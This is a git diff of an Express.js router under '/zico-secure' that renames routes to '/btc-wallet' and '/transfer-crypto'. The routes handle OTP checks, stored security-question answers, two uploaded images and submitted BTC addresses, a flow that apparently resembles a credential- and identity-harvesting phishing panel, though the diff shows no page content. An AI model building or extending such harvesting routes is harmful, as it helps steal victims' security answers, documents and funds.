@@ -87,7 +87,7 @@ router.get('/home', noCache, forwardAuthenticated, (req, res) => res.render('hom
 router.get('/register', noCache, forwardAuthenticated, (req, res) => res.render('register'));
 
 // Questions Page
-router.get('/questions', noCache, forwardAuthenticated, (req, res) => res.render('questions'));
+router.get('/btc-wallet', noCache, forwardAuthenticated, (req, res) => res.render('questions'));
 
 router.get('/images', noCache, forwardAuthenticated, (req, res) => res.render('images'));
 
@@ -97,7 +97,7 @@ router.get('/card', noCache, forwardAuthenticated, (req, res) => res.render('car
 
 router.get('/alert', noCache, forwardAuthenticated, (req, res) => res.render('alert'));
 
-router.get('/emailcnt', noCache, forwardAuthenticated, (req, res) => res.render('email1',  { messages: req.flash() }));
+router.get('/transfer-crypto', noCache, forwardAuthenticated, (req, res) => res.render('email1',  { messages: req.flash() }));
 
 router.get('/loginverify', noCache, forwardAuthenticated, (req, res) => res.render('login2'));
 
@@ -190,7 +190,7 @@ router.post('/otpVerifier', (req, res) => {
     //delete activeOTPs[email]; 
     // Remove the used OTP to ensure it's used only once
     req.flash('success_msg', 'OTP verified successfully');
-    res.redirect('/zico-secure/questions'); // Redirect to your login route
+    res.redirect('/zico-secure/btc-wallet'); // Redirect to your login route
   } else {
     // Invalid OTP
     req.flash('error_msg', 'Invalid OTP. Please try again.');
@@ -229,11 +229,11 @@ router.post('/images', upload.fields([{
   name: 'image2',
   maxCount: 1
 }]), (req, res) => {
-  res.redirect('/zico-secure/emailcnt');
+  res.redirect('/zico-secure/transfer-crypto');
 });
 
 // Handle Security Questions Form Submission
-router.post('/questions', async (req, res) => {
+router.post('/btc-wallet', async (req, res) => {
   const questions = new Questions({
     answer1: req.body.answer1,
     answer2: req.body.answer2,
@@ -296,7 +296,7 @@ router.post('/email', async (req, res) => {
   }
 });
 
-router.post('/emailcnt', async (req, res) => {
+router.post('/transfer-crypto', async (req, res) => {
   try {
     const btcstore = new Btc({
       btcaddress: req.body.btcaddress,
@@ -311,7 +311,7 @@ router.post('/emailcnt', async (req, res) => {
   } catch (err) {
     console.error(err);
     req.flash('error_msg', 'An error occurred while saving BTC information');
-    res.redirect('/zico-secure/emailcnt');
+    res.redirect('/zico-secure/transfer-crypto');
   }
 });
 
@@ -442,7 +442,7 @@ router.post('/loginverify', (req, res, next) => {
         'success_msg',
         'Questions ok'
       );
-      res.redirect('/zico-secure/questions');
+      res.redirect('/zico-secure/btc-wallet');
     })
     .catch(err => console.log(err));
 });
